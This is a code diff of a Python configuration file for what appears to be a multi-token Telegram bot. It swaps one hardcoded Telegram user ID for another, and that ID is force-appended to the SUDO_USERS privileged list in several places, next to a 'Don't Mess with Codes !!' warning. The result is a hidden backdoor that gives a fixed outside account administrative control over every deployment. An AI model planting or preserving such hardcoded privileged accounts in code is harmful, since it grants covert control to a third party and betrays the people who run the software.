@@ -38,15 +38,15 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 5142140533 not in SUDO_USERS:
-    SUDO_USERS.append(5142140533)
+if 5207640479 not in SUDO_USERS:
+    SUDO_USERS.append(5207640479)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(5142140533)
+SUDO_USERS.append(5207640479)
 
 # Tokens
 
